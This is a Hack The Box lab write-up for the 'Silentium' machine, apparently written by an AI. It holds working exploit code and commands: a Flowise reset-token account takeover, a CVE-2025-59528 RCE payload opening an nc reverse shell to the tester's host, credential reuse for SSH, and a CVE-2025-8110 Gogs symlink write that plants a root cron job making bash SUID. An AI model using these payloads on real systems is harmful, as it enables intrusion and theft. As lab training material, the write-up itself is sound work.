---
target: Silentium
ip: 10.129.63.134
platform: HTB
difficulty: Easy
os: Linux
---

# Silentium

**Target:** 10.129.63.134
**Date:** 2026-07-19
**Difficulty:** Easy
**OS:** Linux (Ubuntu 24.04, container: Alpine 3.22.1)

## Skills Required

- **Virtual-host / subdomain enumeration** — recognizing that a single IP
  can serve materially different applications per `Host:` header, and
  probing for them. [OWASP WSTG — Enumerate Infrastructure and Application Admin Interfaces](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage)
- **REST API enumeration against an auth-gated app** — mapping endpoints,
  reading response shapes/status codes to infer backend structure.
  [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x00-header/)
- **Reading a target's real open-source code for patch-diff analysis**,
  not trusting a vendor summary — diffing a vulnerable tag against its fix
  commit. [Pro Git — Git Internals: Git Objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
- **Password-reset / broken-authentication flow attacks** — recognizing
  when a "secure" out-of-band flow leaks its own secret in-band.
  [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html) /
  [OWASP WSTG — Testing for Weak Password Change or Reset Functionalities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities)
- **JWT/session-cookie authentication mechanics** — enough to recognize
  what an app's auth middleware is actually checking (JWT cookie vs. API
  key vs. an internal-request header). [PortSwigger — JWT attacks](https://portswigger.net/web-security/jwt)
- **Node.js `Function()`/`eval()` sandbox semantics** — knowing why
  `require` isn't reachable from a `Function`-constructed scope and how
  `process.mainModule.require()` recovers it. [MDN — Function() constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function)
- **Docker container internals** — namespaces, capabilities, and bind
  mounts, and how to tell whether any of them offer an escape path.
  [Docker Docs — Docker security](https://docs.docker.com/engine/security/) /
  [capabilities(7) — Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- **Git object model, specifically symlink blobs** — understanding that
  git preserves a committed symlink (mode `120000`) as a real OS-level
  symlink on checkout, which is the mechanism the root vector abuses.
  [Pro Git — Git Internals: Git Objects](https://git-scm.com/book/en/v2/Git-Internals-Git-Objects)
- **Standard Linux privesc enumeration** — sudo, SUID/SGID, capabilities,
  cron, group membership (Docker group, etc.). [HackTricks — Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

## Recon

Full-range TCP scan found exactly two open ports — no large attack surface
to sift through, so both got full attention immediately:

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-19 18:19 -0400
Nmap scan report for 10.129.63.134
Host is up (0.059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 22.69 seconds
```

SSH was current (OpenSSH 9.6p1, no known issues), so the only live lead
was HTTP. The port-80 redirect to `http://silentium.htb/` was the first
tell that vhost-based routing was in play rather than a single default
site — nginx doesn't redirect to a named host unless something's
configured to expect that `Host:` header specifically. `silentium.htb`
itself turned out to be a static marketing site for a fictional lending
firm ("Silentium International Asset Management") with a client-side-only
loan calculator — content-discovery with a 40-path wordlist against it
came back 0/40 (catch-all routing to the homepage), and there was no
backend to attack. The page did leak three named staff members though
(Marcus Thorne, "Ben" — Head of Financial Systems, Elena Rossi), which
mattered later for username enumeration.

Manual vhost probing (trying common subdomain patterns against the same
IP with different `Host:` headers — the standard move once one vhost
redirect is observed, since it implies nginx is doing name-based virtual
hosting rather than serving one site) turned up a second, materially
different application:

```
GET /api/v1/version HTTP/1.1
Host: staging.silentium.htb

{"version":"3.0.5"}
```

`staging.silentium.htb` served a React SPA for Flowise, an open-source
LLM-workflow orchestration platform. Every API endpoint I enumerated
(`/api/v1/chatflows`, `/api/v1/credentials`, `/api/v1/users`, `/api/v1/upload`,
etc. — 22 total) returned `401 Unauthorized` except `/api/v1/version`,
which is unauthenticated by design (used above just to fingerprint the
exact release). A staging environment for an LLM platform with a wide,
fully auth-gated API surface was the obvious next target — staging
deployments are routinely weaker-hardened than production, and Flowise's
own feature set (workflow nodes that can shell out, hit external
services, or run custom code) makes any auth bypass here high-value by
default.

Putting this together before moving on: with SSH clean and no lead
there, the entire path had to run through Flowise. A fully auth-gated
API on a staging host, combined with Flowise's own code-execution-capable
node feature set, pointed toward a two-stage shape for the box — first
some way past the 401 wall, then using whatever authenticated feature
surface Flowise exposes to turn that access into code execution. The
named staff member on the marketing page was the first concrete thread
to pull on, since a real, confirmed account gives every subsequent
authentication attack (password guessing, a reset flow, a JWT weakness)
a fixed target instead of a guess.

## Foothold

**Step 1 — confirm a real account exists, via differing login errors.**
Flowise's login endpoint distinguishes "wrong password" from "no such
user" in its response body and status code — a textbook username-
enumeration oracle. Testing the three names recon found on the marketing
page:

```
curl -sk -X POST "http://staging.silentium.htb/api/v1/auth/login" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"placeholder_probe_XyZ123"}' -w "\nHTTP:%{http_code}\n"
```
```
{"statusCode":401,"success":false,"message":"Incorrect Email or Password","stack":{}}
HTTP:401
```
```
curl -sk -X POST "http://staging.silentium.htb/api/v1/auth/login" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -d '{"email":"marcus@silentium.htb","password":"placeholder_probe_XyZ123"}' -w "\nHTTP:%{http_code}\n"
```
```
{"statusCode":404,"success":false,"message":"User Not Found","stack":{}}
HTTP:404
```

`ben@silentium.htb` returned 401 (wrong password, right user); `marcus@`
and `elena@` and `admin@` all returned 404 (no such user). Only `ben` is
real — the difference between "wrong password" and "no such user" is
exactly the kind of response-shape leak that turns a guessed name into a
confirmed target account. I spent roughly 15 reasoned, company-themed
password guesses against `ben` at this point (`Silentium2026!`,
`Ben@Silentium1`, etc.) — all 401, no lockout observed — before finding
the actual bug below made further guessing unnecessary.

**Step 2 — read the real source to find the actual bug, not guess at
one.** I cloned the exact Flowise release the target is running
(`flowise@3.0.5`, commit `ba6a602c`, from
`https://github.com/FlowiseAI/Flowise.git`) to look for anything wrong in
the forgot-password flow rather than continuing to brute-force. The
controller just forwards whatever the service function returns straight
into the HTTP response:

```ts
// packages/server/src/enterprise/controllers/account.controller.ts
public async forgotPassword(req: Request, res: Response, next: NextFunction) {
    try {
        const accountService = new AccountService()
        const data = await accountService.forgotPassword(req.body)
        return res.status(StatusCodes.CREATED).json(data)   // returns the whole AccountDTO
    } catch (error) {
        next(error)
    }
}
```

and the service function builds the reset token, is *supposed* to only
hand it to `sendPasswordResetEmail()`, but keeps it in the same object it
then also returns to the caller:

```ts
// packages/server/src/enterprise/services/account.service.ts
public async forgotPassword(data: AccountDTO) {
    data = this.initializeAccountDTO(data)
    const user = await this.userService.readUserByEmail(data.user.email, queryRunner)
    if (!user) throw new InternalFlowiseError(StatusCodes.NOT_FOUND, UserErrorMessage.USER_NOT_FOUND)

    data.user = user
    data.user.tempToken = generateTempToken()          // plaintext token generated here
    data.user = await this.userService.saveUser(data.user, queryRunner)
    const resetLink = `${process.env.APP_URL}/reset-password?token=${data.user.tempToken}`
    await sendPasswordResetEmail(data.user.email!, resetLink)   // meant to be email-only
    return data     // BUG: data.user.tempToken (+ bcrypt credential hash) go back in the HTTP response too
}
```

The entire point of an out-of-band reset flow is that the token only
reaches an inbox the attacker doesn't control. Here the same token that's
emailed is also serialized straight back into the `201` response body of
`POST /api/v1/account/forgot-password` — and that endpoint (along with
`reset-password`) sits in `WHITELIST_URLS`, i.e. it's reachable with zero
authentication by design. Knowing only a valid email address is enough to
self-service a password reset without ever touching the real mailbox.
I found no CVE/GHSA ID for this specific behavior in Flowise's public
advisories — it isn't one of the two CVEs flagged as already patched on
this box for this engagement (CVE-2026-31431, a Linux kernel LPE, and
CVE-2026-43284, for which no public record exists against Flowise at
all; neither is related to this bug), so I'm treating it as an
independently-found logic flaw rather than a known, tracked issue.

```
curl -sk -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}' -w "\nHTTP:%{http_code}\n"
```
```
HTTP:201
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"kiyhOoZ5jf4u29fRHUYqXZ6wBFluaUDjnRYoXxgTXAWl1MzVqpD8eRIUiU3b8BSA","tokenExpiry":"2026-07-19T22:47:29.433Z","status":"active", ...}}
```

`name":"admin"` confirmed this wasn't just any account — it's the
workspace owner. I generalized this bug class into
[[password-reset-token-in-api-response]].

**Step 3 — take over the account with the leaked token.**
```
curl -sk -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"kiyhOoZ5jf4u29fRHUYqXZ6wBFluaUDjnRYoXxgTXAWl1MzVqpD8eRIUiU3b8BSA","password":"Pwn3d_By_Claude_2026!"}}' \
  -w "\nHTTP:%{http_code}\n"
```
```
HTTP:201
```
```
curl -sk -X POST "http://staging.silentium.htb/api/v1/auth/login" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Pwn3d_By_Claude_2026!"}' \
  -w "\nHTTP:%{http_code}\n" -c cookies.txt
```
```
HTTP:200
Set-Cookie: token=<JWT>; ...
Set-Cookie: refreshToken=<JWT>; ...
```

This confirmed the first half of the working theory from Recon: without
any lead on SSH, the way in genuinely ran straight through the Flowise
auth wall, not around it.

**Step 4 — escalate the authenticated session into RCE via
CVE-2025-59528.** With a valid session I could reach Flowise's node-config
endpoints, where the CustomMCP node's config parser is the vulnerable
sink. `packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts`:

```ts
async getTools(nodeData: INodeData, options: ICommonObject): Promise<Tool[]> {
    const mcpServerConfig = nodeData.inputs?.mcpServerConfig as string
    } else if (typeof mcpServerConfig === 'string') {
        const substitutedString = substituteVariablesInString(mcpServerConfig, sandbox)
        const serverParamsString = convertToValidJSONString(substitutedString)   // vulnerable call
        serverParams = JSON.parse(serverParamsString)
    }
}

function convertToValidJSONString(inputString: string) {
    try {
        const jsObject = Function('return ' + inputString)()   // arbitrary JS eval, no sandbox
        return JSON.stringify(jsObject, null, 2)
    } catch (error) {
        console.error('Error converting to JSON:', error)
        return ''
    }
}
```

The 3.0.6 fix (GHSA-3gcm-f6qx-ff7p) is a one-line swap:

```diff
 function convertToValidJSONString(inputString: string) {
     try {
-        const jsObject = Function('return ' + inputString)()
+        const jsObject = JSON5.parse(inputString)
         return JSON.stringify(jsObject, null, 2)
     } catch (error) {
         console.error('Error converting to JSON:', error)
         return ''
     }
 }
```

`mcpServerConfig` was meant to accept lenient "JS-object-literal-style"
JSON (unquoted keys, etc.), and instead of a real permissive parser like
JSON5 the 3.0.5 code just executes it via `Function()`. Since the target
fingerprinted as exactly `3.0.5` — one release behind the fix, confirmed
from `/api/v1/version` — this path is fully live, with the only gate being
authentication (which I already had via Steps 1–3). This confirmed the
second half of the Recon-stage theory too: Flowise's own code-execution-
capable node feature set, not a separate infrastructure bug, is exactly
what turned authenticated access into RCE. I generalized the bug class
itself, separate from this specific CVE, into
[[js-eval-lenient-json-parser-rce]].

```python
import json
shell_cmd = "nc 10.10.14.46 4444 -e /bin/sh"
js_payload = (
    "(function(){\n"
    "  try {\n"
    f"    process.mainModule.require(\"child_process\").exec({json.dumps(shell_cmd)});\n"
    "  } catch (e) {}\n"
    "  return {command: \"true\"};\n"
    "})()"
)
body = json.dumps({"loadMethod": "listActions", "inputs": {"mcpServerConfig": js_payload}})
```
```
curl -sk -X POST "http://staging.silentium.htb/api/v1/node-load-method/customMCP" \
  --resolve staging.silentium.htb:80:10.129.63.134 \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -b cookies.txt \
  --data-binary @rce_shell.json \
  -w "\nHTTP:%{http_code}\n"
```

`x-request-from: internal` was necessary because
`/api/v1/node-load-method/` isn't in `WHITELIST_URLS` — Flowise's global
auth gate normally demands a separate API key even with a valid JWT
cookie, but sending that header routes the request through JWT/passport
verification instead, which the step-3 session cookie satisfies. The
visible HTTP response is always a generic `"No Available Actions"` error
regardless of whether the injected code ran (the server catches any
exception from `loadMethods.listActions()` before it reaches the response),
so I had to confirm out-of-band:

```
python3 -m http.server 9001 --bind 10.10.14.46
```
```
curl http://10.10.14.46:9001/hello-$(id -u)-$(hostname)
```
Listener:
```
10.129.63.134 - - [19/Jul/2026 18:35:37] "GET /hello-0-c78c3cceb7ba HTTP/1.1" 404 -
```

`hello-0-c78c3cceb7ba` confirmed execution as uid 0 on a host named
`c78c3cceb7ba` — a Docker-style container hostname, not the box itself.
One important sandbox detail from reading the actual `Function()`
semantics: it constructs a function whose lexical scope is only the
*global* scope, so it does **not** close over the enclosing CommonJS
module's local `require` — a naive `require('child_process')` inside the
payload throws `ReferenceError: require is not defined`.
`process.mainModule.require()` (using `process`, a genuine Node global)
is what actually returns a working `require` from inside the sandbox,
which is why the payload above uses it instead.

A first shell attempt (`bash -i >& /dev/tcp/...`) got no callback — the
container turned out to be Alpine with no `/bin/bash` at all, confirmed
via a follow-up `cat /etc/os-release` callback. Busybox `nc -e` worked
instead, caught with a FIFO-backed listener (see
[[reverse-shell-fifo-interaction]]):
```
mkfifo fifo
tail -f fifo | nc -lvnp 4444 > nc.log &
```
```
listening on [any] 4444 ...
connect to [10.10.14.46] from (UNKNOWN) [10.129.63.134] 40113
```
```
id; hostname; pwd; whoami; cat /etc/os-release
```
```
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
c78c3cceb7ba
/
root
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.22.1
```

`uid=0` here is root **inside the Flowise Docker container**, confirmed
by the Alpine `os-release` and the container-style hostname — not
necessarily host root. This didn't complete the working theory so much
as reveal it had been incomplete: nothing found during Recon suggested
Flowise was containerized, so reaching root here didn't automatically
mean reaching the box (recon's own notes never touch on Docker at all,
so there's no earlier reasoning to point to for why this boundary should
have been anticipated — it wasn't, and I'm flagging that gap rather than
pretending it was foreseen). That boundary is the entire subject of the
next stage.

## Privesc

**Ruling out a container escape, systematically.** Rather than guess at
an escape, I ran a full checklist (now generalized as
[[docker-container-escape-enumeration-checklist]]) and every item came
back clean:

- `mount` / `/proc/self/mountinfo` — only `/root/.flowise` bind-mounted
  from the host (`8:4 /root/.flowise /root/.flowise rw,relatime - ext4
  /dev/sda4`), no `docker.sock`, no broad filesystem mount. The
  bind-mount source resolving to the host's literal `/root/.flowise` path
  doesn't help — mountpoint boundaries are VFS-enforced, not just a source
  path string, so `cd ..` from inside it doesn't escape.
- Capabilities — `CapEff: 00000000a00425fb` decoded to exactly Docker's
  default set minus `CAP_MKNOD`. No `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`,
  `CAP_SYS_MODULE`, or `CAP_DAC_READ_SEARCH` — not a `--privileged`
  container.
- PID/network namespaces — `ps aux` showed only the container's own two
  processes (no host process tree visible), `ip a` showed a genuine bridge
  interface (`eth0` on `172.18.0.2/16`) — neither namespace is shared with
  the host.
- User namespace — `/proc/self/uid_map` / `gid_map` both read `0 0
  4294967295` (identity mapping): container uid 0 really is host uid 0,
  which is *why* the bind-mount write later landed as genuinely
  root-owned on the host, but on its own gives no escape.
- Gateway sweep — `nc -z -w1` against `172.18.0.1` across ~55 common
  ports found only `22` and `80` open, matching the box's already-known
  external ports; `/dev/tcp/...` silently failed in this Alpine `ash`,
  `nc -z` was the working substitute.
- Flowise's own `database.sqlite` and a filesystem secret sweep both came
  up empty — one `ben` DB row, empty `credential`/`variable` tables, and
  the only `id_rsa*`/`*.pem` hits were the `ssh2` npm package's own
  well-known test fixtures.

With every escape avenue positively ruled out rather than merely
unexplored, the working theory had nowhere left to go but the
credentials already sitting inside the container — if the container
itself offered no way out, the only path forward was whatever it could
hand me instead.

**Credential reuse into a real host account.** `env` inside the container
included `FLOWISE_PASSWORD` (`F1l3_d0ck3r`, already tried once against
`ben@10.129.63.134` over SSH and failed) and a second, untested
credential — `SMTP_PASSWORD` (`r04D!!_R4ge`), from the same container's
mail-sending config. Since `ben` was already a confirmed real identity
(from the Flowise account itself), testing one more plausible password
against that *same* account — rather than spraying a new account — was a
single reasoned attempt, not a spray:

```python
import paramiko
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect("10.129.63.134", username="ben", password="r04D!!_R4ge",
                timeout=10, banner_timeout=10, auth_timeout=10)
```
```
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
silentium
```

Real host access, Ubuntu 24.04.4, kernel `6.8.0-107-generic` — the
`FLOWISE_PASSWORD`/`SMTP_PASSWORD` pair being separate credentials for
what turned out to be the same underlying human account is a plain
password-reuse-across-services bug, no different in kind from a DB
password doubling as a login password.

```
cat /home/ben/user.txt
```
```
e2f8cbf96cb6b896bc09e53b2340778e
```

**Standard privesc enumeration, all dead ends:**
- `sudo -l` (with `ben`'s own password): `Sorry, user ben may not run
  sudo on silentium.`
- SUID/SGID sweep: entirely stock Ubuntu 24.04 binaries.
- `getcap -r /`: only expected stock capabilities (`ping`, `snap-confine`,
  `gst-ptp-helper`).
- Cron (`/etc/cron.d`, `/etc/crontab`, `crontab -l`): stock Ubuntu jobs
  only, nothing custom or writable.
- `docker.sock` exists (`root:docker`, `srw-rw----`) but `ben` isn't in
  the `docker` group — `permission denied` confirmed.
- World-writable sweep: only the expected `/tmp`/`/var/tmp`-style dirs.

None of the filesystem-based checks surfaced anything, which is exactly
why the real vector — reachable only over HTTP, not via a writable
file — needed a different enumeration angle:

```
ps auxf
```
```
root        1497  0.0  1.7 1738264 68868 ?       Ssl  20:39   0:02 /opt/gogs/gogs/gogs web
```

A `root`-owned process invisible to the original external recon (nmap
only found ports 22 and 80; this is a third HTTP service, reverse-proxied
under a vhost that was never discovered). This overturned the implicit
picture from Recon that the box's whole attack surface was captured by a
two-port nmap scan plus two vhosts — a third, root-owned service had
been running the entire time, invisible externally purely because it
bound to loopback and was never proxied under a vhost the original scan
could find. Reading its config filled in the picture:

```
cat /etc/systemd/system/gogs.service
```
```
[Service]
Type=simple
User=root
WorkingDirectory=/opt/gogs/gogs
ExecStart=/opt/gogs/gogs/gogs web
Restart=always
```
```
cat /opt/gogs/gogs/custom/conf/app.ini
```
```
RUN_USER   = root
HTTP_ADDR        = 127.0.0.1
HTTP_PORT        = 3001
DOMAIN           = staging-v2-code.dev.silentium.htb
ENABLE_REGISTRATION_CAPTCHA = true
DISABLE_REGISTRATION        = false
```
```
/opt/gogs/gogs/gogs --version
```
```
Gogs version 0.13.3
```

`RUN_USER = root` is the detail that turns this into a straight line to
root: any authenticated file-write primitive against this Gogs instance
runs with root's own filesystem privileges.

**CVE-2025-8110 — Gogs symlink-traversal bypass.** Full patch-diff
analysis lives in [[CVE-2025-8110]]; summary of the mechanism. Gogs'
Contents API (`PUT /api/v1/repos/:owner/:repo/contents/:path`) updates a
file by checking the target branch out to an on-disk working copy and
writing new content directly to `<local_copy>/<treePath>`. The prior fix
for CVE-2024-55947 only rejected `../` sequences in the *client-supplied
path string* — it never re-resolved what that path actually pointed to on
disk. Since Gogs correctly preserves a committed symlink (git blob mode
`120000`, per the git object model) as a real OS-level symlink on
checkout, committing `evil -> /etc/cron.d/pwn` into a repo and then
`PUT`-ing to `evil` makes the write follow that symlink straight outside
the repository:

```diff
+ // internal/pathutil/symlink.go (new in v0.13.4)
+ func ValidatePathSecurity(base, target string) error {
+     // fully resolves target through every symlink in the chain,
+     // rejects if the resolved destination falls outside base
+ }
```
```diff
  func UpdateRepoFile(...) error {
+     if err := repoutil.ValidatePathWithin(oldTreeName, repoPath); err != nil { return err }
+     if err := repoutil.ValidatePathWithin(newTreeName, repoPath); err != nil { return err }
      // ... existing checkout + write logic, unchanged
  }
```

The fix (v0.13.4, commit `553707f`, GHSA-mq8m-42gh-wq7r) added that
real-destination resolution to `UpdateRepoFile()`, `PutContents()`,
`DeleteFilePost()`, and `UploadFilePost()` — every write-by-path code
path, not just the Contents API. This target fingerprinted as exactly
`0.13.3`, one release behind that fix.

**Getting an authenticated Gogs account.** Registration was open
(`DISABLE_REGISTRATION = false`) but CAPTCHA-gated. There's no known
bypass for `go-macaron/captcha`'s noisy 6-digit PNG, and a blind guess
(10^6 space) wasn't a sane use of budget — I fetched the image and read
it directly instead:

```python
r = s.get("http://127.0.0.1:3001/user/sign_up")
# extract _csrf, captcha_id from the HTML
img = s.get(f"http://127.0.0.1:3001/captcha/{captcha_id}.png")
```
Read visually (6x upscaled for legibility, no OCR tooling on hand):
digits `215768`.
```python
data = {"_csrf": csrf, "user_name": "pentest01", "email": "pentest01@example.com",
         "password": "Pentest_Pwn2026!", "retype": "Pentest_Pwn2026!",
         "captcha_id": captcha_id, "captcha": "215768"}
r = s.post("http://127.0.0.1:3001/user/sign_up", data=data, allow_redirects=False)
```
```
Status: 302 Location: /user/login
```

Registration succeeded on the first read. Getting an API token turned up
an undocumented quirk: basic auth against `/api/v1/user` with the new
account's own password returned `401` even though the same credentials
logged in fine via the web form — Gogs' API here only accepts a personal
access token, not the raw password. Generating one via
`/user/settings/applications` and then re-fetching that page showed the
token *name* but never its *value* in the HTML — Gogs 0.13.3 only reveals
a newly created token's value once, in the `macaron_flash` `Set-Cookie`
header on the creation `POST` response:
```
Set-Cookie: macaron_flash=info%3D977f868d0ca42b2a1c007e64ce40ac46170e4137%26success%3D...
```
```
curl -H "Authorization: token 977f868d0ca42b2a1c007e64ce40ac46170e4137" \
  http://127.0.0.1:3001/api/v1/user
```
```
{"id":2,"username":"pentest01","login":"pentest01", ...}
```

**Exploiting it.** Repo creation with `auto_init=true` gave a 500 server-side —
worked around it by creating an empty repo and pushing the first commit
manually, unrelated to the vulnerability itself:

```
curl -s -X POST http://127.0.0.1:3001/api/v1/user/repos \
  -H "Authorization: token 977f868d0ca42b2a1c007e64ce40ac46170e4137" \
  -H "Content-Type: application/json" \
  -d '{"name":"pwnrepo2","description":"test","private":false,"auto_init":false}'
```
```
201 Created
```
```bash
git config --global user.email "pentest01@example.com"
git config --global user.name "pentest01"
git clone "http://pentest01:977f868d0ca42b2a1c007e64ce40ac46170e4137@127.0.0.1:3001/pentest01/pwnrepo2.git" /tmp/pwnrepo2
cd /tmp/pwnrepo2
echo readme > README.md
git add README.md
git commit -m init
git branch -M master
git push -u origin master

ln -sf /etc/cron.d/pwn evil
git add evil
git -c user.email=pentest01@example.com -c user.name=pentest01 commit -m "add symlink"
git push origin master
```
```
[master b964468] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 evil
To http://127.0.0.1:3001/pentest01/pwnrepo2.git
   d8ffcf5..b964468  master -> master
```

Confirmed Gogs sees it as a symlink (the bug is only in the write path,
reads are fine):
```
curl -s http://127.0.0.1:3001/api/v1/repos/pentest01/pwnrepo2/contents/evil \
  -H "Authorization: token 977f868d0ca42b2a1c007e64ce40ac46170e4137"
```
```
{"type":"symlink","target":"/etc/cron.d/pwn","size":15,"name":"evil","path":"evil","sha":"7030262616e16c51c4d17ff6cecc6c7dbcb3445a", ...}
```

Trigger the write:
```python
import requests, base64
token = "977f868d0ca42b2a1c007e64ce40ac46170e4137"
cron_line = "* * * * * root chmod 4777 /bin/bash\n"
body = {
    "content": base64.b64encode(cron_line.encode()).decode(),
    "message": "update evil",
    "sha": "7030262616e16c51c4d17ff6cecc6c7dbcb3445a",
    "branch": "master",
}
r = requests.put(
    "http://127.0.0.1:3001/api/v1/repos/pentest01/pwnrepo2/contents/evil",
    headers={"Authorization": f"token {token}"}, json=body,
)
```
`201 Created` — Gogs' own bookkeeping thinks it updated a file inside the
repo (that's exactly the misleading half of the bug). Verified the write
actually escaped to the real host path, as root:
```
ls -la /etc/cron.d/pwn
```
```
-rw------- 1 root root 36 Jul 19 22:58 /etc/cron.d/pwn
```
`ben` gets `Permission denied` trying to `cat` it — `600 root:root`,
proof the write happened with root's own privileges via the symlink, not
`ben`'s.

## Root

Cron picked up the new entry within a minute, confirming the write had
landed in a path root's own cron daemon actually executes rather than
just a filesystem location Gogs happened to be able to reach:
```
ls -la /bin/bash
```
```
-rwsrwxrwx 1 root root 1446024 Mar 31  2024 /bin/bash
```
```
/bin/bash -p -c 'id; hostname; cat /root/root.txt'
```
```
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben),100(users)
silentium
07bc03c83953dedc6536a267de3f3c82
```

`bash -p` preserves the effective UID from the SUID bit instead of
dropping it the way plain `bash` would — `euid=0` there is the actual
privilege the cron job granted.

## Skills Learned

- Vhost enumeration surfacing a distinct, higher-value application
  (`staging.silentium.htb` / Flowise) invisible from the root domain
- Username enumeration via differing login error messages (401 vs. 404)
- Unauthenticated account takeover via a forgot-password response body
  that leaks its own reset token (Flowise, no assigned CVE)
- Patch-diff analysis of real Flowise 3.0.5 source against the 3.0.6 fix
  commit
- CVE-2025-59528 — Flowise CustomMCP `Function()`-as-JSON-parser RCE
- Node.js `Function()` constructor sandbox escape via
  `process.mainModule.require()`
- Systematic Docker container-escape enumeration (mounts, capabilities,
  PID/network/user namespaces, gateway port sweep) to positively rule out
  an escape rather than assume one doesn't exist
- Credential reuse across unrelated services (Flowise SMTP env var → host
  SSH password)
- Process-list enumeration (`ps auxf`) surfacing an undocumented
  loopback-bound service and vhost recon never found
- CVE-2025-8110 — Gogs Contents-API symlink-traversal bypass of an earlier
  path-traversal fix (CVE-2024-55947), authenticated arbitrary root file
  write
- Manual CAPTCHA solving (visual, no OCR) to obtain an authenticated Gogs
  account
- Recovering a one-shot Gogs personal access token from a `Set-Cookie`
  (`macaron_flash`) header instead of page HTML
- Cron-planted SUID-bit privesc (`chmod 4777 /bin/bash`)

## Lessons Learned

- **An "out-of-band" security control is only as strong as its weakest
  code path returning the same secret in-band.** Flowise's forgot-password
  flow was designed correctly at the "email the token" layer and broken
  entirely at the "also serialize the whole object back to the HTTP
  caller" layer — the two layers share the same in-memory data by
  construction unless someone explicitly strips it before the response.
  Any endpoint that generates a secret meant for one channel is worth
  checking for whether it also returns that secret through the channel
  the request itself came in on.
- **"Accepts relaxed/lenient syntax" is a real feature that too often gets
  implemented by handing input to the language's own interpreter.**
  `Function('return ' + input)()` isn't a JSON parser with extra
  tolerance, it's `eval()` with a different name. The fix (JSON5) proves
  the convenience and the security property aren't actually in tension —
  a real permissive parser gets you both.
- **Root inside a container is a checkpoint, not the finish line — but
  it's worth positively ruling escape in or out rather than assuming.**
  A full, systematic pass (mounts, capabilities, namespaces, gateway
  sweep) that comes back entirely clean is still useful: it tells you
  confidently to stop looking for an escape and start looking at what
  credentials/data are reachable from inside instead, rather than burning
  more time on a bug that may not exist on this particular container.
- **The same secret value showing up under two different-sounding
  environment variable names is still credential reuse.**
  `FLOWISE_PASSWORD` and `SMTP_PASSWORD` looked like they belonged to
  different subsystems; one of them was, in fact, the real human
  account's actual login password. Test every credential found against
  every login surface, not just the one whose name suggests a match.
- **`ps auxf` is real attack-surface discovery, not just situational
  awareness.** A root-owned, loopback-bound git server was completely
  invisible to external recon (it was never proxied under a discoverable
  vhost during the original scan) and would have stayed invisible without
  listing processes from an unprivileged shell.
- **A patched vulnerability's fix scope tells you where the *next* bypass
  is likely to hide.** CVE-2024-55947's fix validated the client-supplied
  path *string*; CVE-2025-8110 exists precisely because that fix never
  re-validated what the string resolved to on disk after symlinks were
  followed. Reading a prior patch's actual diff — not just its
  changelog description — is often the fastest way to guess where a
  "bypass of an earlier fix" CVE will turn out to live.
